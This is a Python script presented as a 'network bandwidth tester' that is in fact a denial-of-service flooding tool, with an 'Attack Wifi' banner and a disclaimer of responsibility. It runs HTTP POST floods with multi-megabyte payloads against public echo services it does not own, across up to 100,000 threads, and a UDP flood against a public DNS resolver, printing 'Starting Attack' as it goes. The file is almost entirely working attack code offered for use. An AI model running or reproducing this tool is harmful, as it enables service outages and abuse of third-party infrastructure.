import requests
import threading
import time
import random
import urllib3
from concurrent.futures import ThreadPoolExecutor
import socket
import sys
import psutil
import asyncio
import aiohttp
import os
from pyfiglet import Figlet

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedNetworkBandwidthTester:
    def __init__(self):
        self.total_data_sent = 0
        self.total_requests = 0
        self.active_threads = 0
        self.max_threads = 100000
        self.is_running = False
        self.start_time = None
        
    def generate_large_payload(self, size_kb=1024):
        return 'A' * (size_kb * 1024)
    
    def generate_mixed_payload(self, size_kb=512):
        base_data = 'X' * (size_kb * 512)
        random_data = ''.join(chr(random.randint(65, 90)) for _ in range(size_kb * 512))
        return base_data + random_data
    
    def system_resource_check(self):
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        
        if cpu_percent > 85:
            print(f"⚠️ CPU usage high: {cpu_percent}% - throttling threads")
            return False
        if memory.percent > 85:
            print(f"⚠️ Memory usage high: {memory.percent}% - throttling threads")
            return False
        return True
    
    def send_intelligent_http_requests(self, target_url, duration=30, intensity="high"):
        print(f"🚀 Starting HTTP to {target_url} - Intensity: {intensity}")
        
        intensity_settings = {
            "low": {"size_kb": 100, "delay": 0.5},
            "medium": {"size_kb": 512, "delay": 0.1},
            "high": {"size_kb": 1024, "delay": 0.01},
            "extreme": {"size_kb": 20048, "delay": 0.001}
        }
        
        config = intensity_settings[intensity]
        start_time = time.time()
        session = requests.Session()
        
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        }
        
        while self.is_running and (time.time() - start_time < duration):
            if not self.system_resource_check():
                time.sleep(2)
                continue
                
            try:
                
                if random.random() > 0.7:
                    payload = {"data": self.generate_mixed_payload(config["size_kb"])}
                else:
                    payload = {"data": self.generate_large_payload(config["size_kb"])}
                
                response = session.post(
                    target_url,
                    json=payload,
                    headers=headers,
                    timeout=15,
                    verify=False
                )
                
                self.total_requests += 1
                data_sent = len(str(payload).encode('utf-8'))
                self.total_data_sent += data_sent
                
                if self.total_requests % 25 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.total_data_sent / (elapsed * 1024 * 1024) if elapsed > 0 else 0
                    print(f"📤 Requests: {self.total_requests} | Data: {self.total_data_sent/(1024*1024):.1f}MB | Rate: {rate:.1f}MB/s")
                
                time.sleep(config["delay"])
                
            except requests.exceptions.Timeout:
                print("⏰ Request timeout")
            except requests.exceptions.ConnectionError:
                print("🔌 Connection error - retrying...")
                time.sleep(1)
            except Exception as e:
                print(f"❌ Request failed: {str(e)[:50]}...")
                
        session.close()
    
    def send_advanced_udp_packets(self, target_host="8.8.8.8", target_port=53, duration=30):
        print(f"🎯 Starting UDP flood to {target_host}:{target_port}")
        start_time = time.time()
        packet_count = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.1)
            
            while self.is_running and (time.time() - start_time < duration):
                try:
                    
                    sizes = [512, 1024, 1400, 512]
                    packet_size = random.choice(sizes)
                    packet_data = os.urandom(packet_size)
                    
                    sock.sendto(packet_data, (target_host, target_port))
                    packet_count += 1
                    self.total_data_sent += packet_size
                    self.total_requests += 1
                    
                    if packet_count % 1000 == 0:
                        time.sleep(0.01)
                        
                    if packet_count % 500 == 0:
                        print(f"📦 UDP packets send: {packet_count}")
                        
                except socket.error as e:
                    print(f"🔌 UDP socket error: {e}")
                    break
                    
            sock.close()
            
        except Exception as e:
            print(f"❌ UDP test failed: {e}")
    
    def start_distributed_load_test(self, target_urls, duration=120, intensity="high"):
        print(f"🔥 Starting {duration} seconds")
        print(f"🎯 Targets: {len(target_urls)} | Intensity: {intensity}")
        
        self.is_running = True
        self.start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            
            for url in target_urls:
                
                for i in range(8): 
                    future = executor.submit(
                        self.send_intelligent_http_requests, 
                        url, 
                        duration, 
                        intensity
                    )
                    futures.append(future)
            

            for i in range(3):
                future = executor.submit(
                    self.send_advanced_udp_packets,
                    "8.8.8.8", 53, duration
                )
                futures.append(future)
            

            self.monitor_test_progress(duration)
            
            
            for future in futures:
                try:
                    future.result(timeout=duration + 10)
                except Exception as e:
                    print(f"Thread completed with error: {e}")
    
    def monitor_test_progress(self, duration):
        print("🔰 Starting Attack")
        
        def monitor():
            interval = 5  
            iterations = duration // interval
            
            for i in range(iterations):
                if not self.is_running:
                    break
                    
                elapsed = time.time() - self.start_time
                if elapsed > 0:
                    data_rate = self.total_data_sent / (elapsed * 1024 * 1024)  
                    req_rate = self.total_requests / elapsed
                    

                time.sleep(interval)
        
        monitor_thread = threading.Thread(target=monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
    
    def emergency_stop(self):
        self.is_running = False

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    
    f = Figlet(font='slant')
    print(f.renderText('Attack Wifi'))
    
    print("information: t.me/SpamEmailInformation")
    print("⚠️ WARNING: Gw Ga Bertanggung Jawab Atas Tindakan Kalian")
    print(" ")

print_banner()

def main():
    print_banner()
    
    test_targets = [
        "https://httpbin.org/post",
        "https://jsonplaceholder.typicode.com/posts", 
        "https://postman-echo.com/post",
        "https://httpbun.com/post",
        "https://httpstat.us/200"
    ]
    
    tester = AdvancedNetworkBandwidthTester()
    
    try:
        duration = int(input("Enter duration: ") or "60")
        intensity = input("Enter intensity (low/medium/high/extreme): ") or "high"
        
        duration = min(duration, 30000)
        intensity = intensity.lower() if intensity.lower() in ["low", "medium", "high", "extreme"] else "high"
        
        print(f"\n🎯 Starting Attack:")
        print(f"   Duration: {duration} seconds")
        print(f"   Intensity: {intensity}")
        print(f"   Targets: {len(test_targets)} endpoints")
        print(f"   Max Threads: {tester.max_threads}")
        print("\nPress Ctrl+C to stop test early\n")
        
        time.sleep(2)
        
        
        
        tester.start_distributed_load_test(test_targets, duration, intensity)
        
    except KeyboardInterrupt:
        tester.emergency_stop()
    
    except Exception as e:
        print(f"\n💥 Unexpected error: {e}")
        tester.emergency_stop()
    
    finally:
        total_time = time.time() - tester.start_time if tester.start_time else 0
        
        print(f"\n📊 RESULTS:")
        print(f"⏱️  Total duration: {total_time:.1f} seconds")
        print(f"📤 Total requests: {tester.total_requests:,}")
        print(f"💾 Total data sent: {tester.total_data_sent/(1024*1024):.2f} MB")
        
        if total_time > 0:
            print(f"📈 Average data rate: {tester.total_data_sent/(total_time*1024*1024):.2f} MB/s")
            print(f"📈 Average request rate: {tester.total_requests/total_time:.1f} requests/sec")
        
        print("completed")

if __name__ == "__main__":
    main()
